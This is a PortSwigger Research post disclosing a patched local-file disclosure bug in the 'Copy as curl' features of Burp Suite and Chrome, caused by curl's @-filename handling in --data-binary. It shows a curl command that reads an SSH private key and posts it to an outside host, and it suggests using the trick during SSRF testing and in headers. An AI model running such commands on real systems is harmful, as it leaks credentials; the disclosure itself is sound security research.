---
source: portswigger-research
source_url: https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome
title: "The curl quirk that exposed Burp Suite & Google Chrome | PortSwigger Research"
published: 2023-03-28T13:13:51
description: "In this post, we'll explore a little-known feature in curl that led to a local-file disclosure vulnerability in both Burp Suite Pro, and Google Chrome. We patched Burp Suite a while back, but suspect"
---

# The curl quirk that exposed Burp Suite & Google Chrome

![James Kettle](https://portswigger.net/content/images/profiles/callout_james_kettle_112px.png)

### [James Kettle](https://portswigger.net/research/james-kettle)

Director of Research

[@albinowax](https://twitter.com/albinowax)

- **Published:** Tuesday, 28 March 2023 at 13:13 UTC

- **Updated:** Tuesday, 28 March 2023 at 13:13 UTC


![A laptop using a fishing line to pick someone's pocket](https://portswigger.net/cms/images/56/e3/f99d-article-curl_quirk_blog-article.png)

In this post, we'll explore a little-known feature in curl that led to a local-file disclosure vulnerability in both [Burp Suite Pro](https://portswigger.net/burp/pro), and Google Chrome. We patched Burp Suite a while back, but suspect the technique might be useful to exploit other applications that have a 'copy as curl' feature, or invoke curl from the command line. This vulnerability was privately reported to our [bug bounty program](https://hackerone.com/portswigger) by [Paul Mutton](https://twitter.com/paulmutton), and he's kindly agreed to let us publish this writeup.

Burp Suite users often craft complex HTTP requests to demonstrate vulnerabilities in websites. To make sharing these proof-of-concept exploits with other people easier, we have a `Copy as curl command` feature which generates a curl command that replicates a request inside Burp Suite.

For example, given the following request:

`POST / HTTP/1.1
Host: portswigger.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar`

If you click `Copy as curl command`, Burp Suite will generate the following command and copy it to the clipboard:

`curl -i -s -k
    -X $'POST' \
    -H $'Host: portswigger.net' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'Content-Length: 7' \
    --data-binary $'foo=bar' \
    $'https://portswigger.net/'`

You can then paste this command into the terminal to re-issue the request outside Burp Suite. We're careful about escaping this data to avoid users being exploited by malicious requests injecting extra shell commands, or arbitrary curl arguments.

Unfortunately, there's a subtler problem. Can you see it?

As usual, the answer lies in the [friendly manual](https://curl.se/docs/manpage.html#--data-binary):

`--data-binary <data>

This posts data exactly as specified with no extra processing whatsoever.

If you start the data with the letter @, the rest should be a filename.`

So, this is safe:

`curl --data-binary  '/home/albinowax/.ssh/id_rsa' --trace-ascii - https://02.rs/
=> Send data, 28 bytes (0x1c)
0000: /home/albinowax/.ssh/id_rsa`

And this is... not so safe:

`curl --data-binary '@/home/albinowax/.ssh/id_rsa' --trace-ascii - https://02.rs/
=> Send data, 662 bytes (0x296)
> -----BEGIN RSA PRIVATE KEY-----.b3BlbnNzaC1rZXktdjEA....`

(Not my real private key)

We patched this vulnerability in release 2020.5.1 by switching to the newer and safer but less-supported `--data-raw` flag if the request body starts with an @ symbol.

We were lucky in that exploiting this in Burp Suite required relatively heavy user-interaction - the attacker would have to induce a user to visit a malicious website, copy the crafted request as a curl command, and then execute it via the command line. If a website uses curl with an attacker-controlled request body, this could have a significantly higher impact, so it's definitely worth keeping an eye out for during [SSRF](https://portswigger.net/web-security/ssrf) testing. The @ file-read behaviour works with headers too, so it could be useful on sites that let you define a custom header.

Although this feature took us ( [and Chrome](https://chromium.googlesource.com/devtools/devtools-frontend/+/d2663acda4ce90bc2b23e3569cbd21ad7df74593%5E%21/#F0)) by surprise, it is fully documented so we don't consider it to be a vulnerability in curl itself. It reminds me of [server-side template injection](https://portswigger.net/web-security/server-side-template-injection), where a sandbox escape can be as easy as reading a manual page everyone else overlooked.

Thanks again to Paul for sharing this cool technique.

Till next time!

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[05 February 2026](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025) [06 January 2026](https://portswigger.net/research/top-10-web-hacking-techniques-of-2025-nominations-open) [**The Fragile Lock:**\\
Novel Bypasses For SAML Authentication 10 December 2025The Fragile Lock:Novel Bypasses For SAML Authentication](https://portswigger.net/research/the-fragile-lock) [**Introducing HTTP Anomaly Rank** 11 November 2025Introducing HTTP Anomaly Rank](https://portswigger.net/research/introducing-http-anomaly-rank)